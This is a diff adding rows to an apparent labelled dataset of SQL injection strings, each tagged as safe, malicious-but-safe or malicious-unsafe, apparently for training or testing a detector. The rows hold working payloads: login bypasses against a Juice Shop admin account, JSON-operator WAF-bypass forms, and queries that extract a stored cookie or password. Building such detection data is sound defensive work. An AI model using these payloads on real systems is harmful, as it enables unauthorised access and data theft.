+' OR '1'='1' /* ,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=!!!!!<very long fuzz payload omitted>or,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+admin%40juice-sh.op\'and%20likely%20(id)--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=\'or'1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=\""or""1",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=\`or`1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=\'and,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='or'1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=\'fooor,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=newline,Safe,ChatGPT5.2 thinking
+\'and1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=Incorrectly constructed SQL statements,Safe,ChatGPT5.2 thinking
+or using comments to even block the rest of the query (there are three types of SQL comments[14]). All three lines have a space at the end:,Safe,ChatGPT5.2 thinking
+email=admin@juice-sh.op';&password=foo,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=admin@juice-sh.op';,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"email=admin@juice-sh.op"";",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=admin@juice-sh.op`;,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email='foo';'bar';'def',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=`foo`;`bar`;`def`,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=root@example.com'/* comment */;,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""b"":2}'::jsonb <@ '{""a"":1, ""b"":2}'::jsonb",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""b"":2}'::jsonb <@ '{""a"":1, ""b"":2}'::jsonb",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""b"":2}'::jsonb <@ '{""a"":1, ""b"":2}'",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""b"":2}'::jsonb <@ '{""a"":1, ""b"":2}'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""b"":2}' <@ '{""a"":1, ""b"":2}'::jsonb",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""b"":2}' <@ '{""a"":1, ""b"":2}'::jsonb",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""b"":2}'::json <@ '{""a"":1, ""b"":2}'",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""b"":2}'::json <@ '{""a"":1, ""b"":2}'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""b"":2}' <@ '{""a"":1, ""b"":2}'::json",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""b"":2}' <@ '{""a"":1, ""b"":2}'::json",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""b"":2}'::jsonb @> '{""a"":1, ""b"":2}'::jsonb",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""b"":2}'::jsonb @> '{""a"":1, ""b"":2}'::jsonb",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""b"":2}'::jsonb < '{""a"":1, ""b"":2}'::jsonb",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""b"":2}'::jsonb < '{""a"":1, ""b"":2}'::jsonb",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""b"":2}'::jsonb > '{""a"":1, ""b"":2}'::jsonb",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""b"":2}'::jsonb > '{""a"":1, ""b"":2}'::jsonb",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""a"":2,""c"":[4,5,{""f"":7}]}' -> '$.c[2].f' = 7",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""a"":2,""c"":[4,5,{""f"":7}]}' -> '$.c[2].f' = 7",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""a"":2,""c"":[4,5,{""f"":7}]}' <- '$.c[2].f' = 7",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/OR '{""a"":2,""c"":[4,5,{""f"":7}]}' <- '$.c[2].f' = 7",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR json_extract('{""id"": 14, ""name"": ""Aztalan""}', '$.name') = 'Aztalan'",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR json_extract('{""id"": 14, ""name"": ""Aztalan""}', '$.name') = 'Aztalan'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=blah/""}' and data @> '{""a"":""a""}' union select ASCII(s.token) from unnset(string_to_array((select cookie from cookie limit 1 ),NULL)) s(token)--/state",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/blah/""}' and data @> '{""a"":""a""}' union select ASCII(s.token) from unnset(string_to_array((select cookie from cookie limit 1 ),NULL)) s(token)--/state",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""a"":""b""}' ? 'a'",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""a"":""b""}' ? 'a'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '[1,2]' ? '1'",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '[1,2]' ? '1'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""name"":""asd""}' ?| array['a','name']",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""name"":""asd""}' ?| array['a','name']",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""name"":""asd""}' ?& array['a','name']",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""name"":""asd""}' ?& array['a','name']",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '[1,2,3]'::json ->> 2='3'",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '[1,2,3]'::json ->> 2='3'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"id=OR '{""a"":1}'::jsonb #> '{a,b}' ? 'c'",Malicious-Unsafe,ChatGPT5.2 thinking
+"/OR '{""a"":1}'::jsonb #> '{a,b}' ? 'c'",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"email=1.e(ascii+1.e(substring(1.e(select+password+from+users+limit+1+1.e,1+1.e)+1.e,1+1.e,1+1.e)1.e)1.e)+=+70+or'1'='2",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+foo=1.e(ascii),MaliciousIntended-but-safe,ChatGPT5.2 thinking
